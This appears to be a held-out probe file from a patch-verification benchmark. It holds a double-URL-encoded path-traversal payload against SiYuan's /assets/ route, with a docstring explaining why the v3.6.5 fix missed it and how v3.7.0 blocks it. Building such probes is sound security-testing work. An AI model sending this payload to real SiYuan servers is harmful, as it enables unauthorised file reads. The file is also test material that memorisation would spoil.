#!/usr/bin/env python3
"""[HELD-OUT] CVE-2026-54066 residual — SiYuan /assets/ double-URL-encode traversal.

Fired via a REAL external HTTP GET against the running, unmodified SiYuan kernel.
The CVE-2026-41894 fix (v3.6.5) added gulu.File.IsSubPath() containment to the
/export/ route (serveExport) but left the SIBLING /assets/*path route untouched:
kernel/model/assets.go GetAssetAbsPath() still has a redundant url.PathUnescape()
fallback that is BYTE-IDENTICAL to v3.6.4:

    unescaped, secondErr := url.PathUnescape(relativePath)
    if secondErr == nil && unescaped != relativePath {
        absPathUnescaped, secondErr := getAssetAbsPath(unescaped)   # ".." resolves here
        ...
    }

So the SAME %252e%252e double-encode that V1 blocks on /export/ still traverses on
/assets/: net/http decodes %252e -> %2e once, gin hands "assets/%2e%2e/%2e%2e/pcb_flag.txt"
to GetAssetAbsPath, the first getAssetAbsPath() misses (literal %2e), then the fallback
url.PathUnescape() decodes to "assets/../../pcb_flag.txt" -> <workspace>/pcb_flag.txt
(still inside the workspace, so getAssetAbsPath's own IsSubPath(WorkspaceDir) guard
allows it) and http.ServeFile serves the flag file.

  reaches flag on V1 (v3.6.5, fallback still present)  ->  HTTP 200 + flag body
  BLOCKED  on V2 (v3.7.0, CVE-2026-54066 removes the fallback, drops the serveAssets
                  retry block, and adds util.IsSensitivePath)  ->  HTTP 404 Not Found
"""

# Same double-encoded "../../" vector as the /export/ seed, but on the sibling
# /assets/ route that v3.6.5 left unpatched.
RESIDUAL_PATH = "/assets/%252e%252e/%252e%252e/pcb_flag.txt"


def candidate():
    return {"probe_id": "cve-2026-54066-assets-residual", "path": RESIDUAL_PATH}
